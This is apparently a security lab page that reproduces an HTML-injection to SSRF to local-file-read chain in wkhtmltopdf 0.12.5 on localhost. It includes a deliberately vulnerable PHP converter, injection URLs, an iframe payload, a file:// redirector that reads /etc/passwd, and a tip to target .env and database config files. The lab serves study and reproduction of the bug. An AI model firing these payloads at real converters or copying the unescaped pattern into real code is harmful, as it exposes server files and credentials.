---
tags:
  - Reference
  - Web
---

# :material-file-pdf-box: Lab — wkhtmltopdf SSRF → LFI

<span class="pill pill-hard">→ file read</span> <span class="pill pill-info">web</span>

A local reproduction of the HTML-injection → SSRF → arbitrary-file-read chain in
`wkhtmltopdf`. You inject a tag into a field that gets rendered into a PDF, and
the render engine fetches whatever you point it at — server-side.

!!! abstract "TL;DR"
    Install wkhtmltopdf **0.12.5**, serve a PHP page that pastes user input into
    HTML and shells out to the converter, then hit it with a tag payload. The
    technique itself is on [SSRF](../../web/ssrf.md).

## :material-package-down: Install the vulnerable version

Pin **0.12.5** — later builds and distro packages change the behaviour you're
trying to reproduce.

=== "Debian / Ubuntu"

    ```bash
    apt-get install libfontenc1 xfonts-75dpi xfonts-base xfonts-encodings xfonts-utils openssl build-essential libssl-dev libxrender-dev git-core libx11-dev libxext-dev libfontconfig1-dev libfreetype6-dev fontconfig -y
    wget https://github.com/wkhtmltopdf/wkhtmltopdf/releases/download/0.12.5/wkhtmltox_0.12.5-1.bionic_amd64.deb
    dpkg -i wkhtmltox_0.12.5-1.bionic_amd64.deb
    apt --fix-broken install
    ```

=== "Kali"

    ```bash
    sudo apt-get install wkhtmltopdf
    ```

Confirm it runs and note the version — the User-Agent it sends is how you
fingerprint the engine on a real target:

```bash
wkhtmltopdf --version
```

## :material-web: Serve a vulnerable converter

The bug needs an app that takes input, drops it into HTML **unescaped**, and
converts that HTML to a PDF. Drop this in your web root (`/var/www/html/ss2.php`)
with Apache and PHP installed:

```php title="ss2.php"
<?php
// Deliberately vulnerable: user input goes into the HTML with no escaping,
// then wkhtmltopdf renders that HTML server-side.
$input = $_REQUEST['xss'];
file_put_contents('test.html', "<html><body><h3>Report</h3>{$input}</body></html>");
shell_exec('wkhtmltopdf test.html test.pdf');
echo 'PDF generated: <a href="test.pdf">test.pdf</a>';
```

```bash
sudo systemctl start apache2
# the web user needs to be able to write the html/pdf next to the script
sudo chown www-data:www-data /var/www/html
```

## :material-play: Fire the chain

**1 — Confirm the injection lands** in the rendered PDF:

```text
http://127.0.0.1/ss2.php?xss="><h1>XSS</h1>
```

Open `test.pdf`. A rendered heading means your HTML reached the engine.

**2 — Confirm server-side fetch.** Start a listener, then inject an image tag —
scripts are blocked, resource tags are not:

```bash
python3 -m http.server 8000
```

```text
http://127.0.0.1/ss2.php?xss="><img src="http://127.0.0.1:8000/">
```

A hit on your listener with a `wkhtmltopdf` User-Agent confirms SSRF.

**3 — Escalate to file read.** Serve the redirector that flips the scheme:

```php title="test.php"
<?php header('location:file://'.$_REQUEST['url']); ?>
```

```text
http://127.0.0.1/ss2.php?xss="><iframe height="2000" width="800" src=http://127.0.0.1:8000/test.php?url=%2fetc%2fpasswd></iframe>
```

`/etc/passwd` now renders inside the generated PDF.

!!! tip "Prove the chain, then vary it"
    Once `/etc/passwd` lands, swap the tag for `embed`, `object` and `img` to see
    which survive filtering, and point `url=` at an app config
    (`config/database.yml`, `.env`) to reproduce the real-world impact rather
    than the proof-of-concept.

## :material-link-variant: Related

- The technique and its variants → [SSRF](../../web/ssrf.md).
- File-read escalation context → [LFI / Path Traversal](../../web/path-traversal.md).
- Same class in a shipping product → [OutSystems `/HtmlToPdfConverter`](../../webtech/outsystems.md).
- Source: ["SSRF to Local File Read via Wkhtmltopdf" by Hassan Khan Yusufzai](https://hassankhanyusufzai.com/blogs/ssrf-lfi).
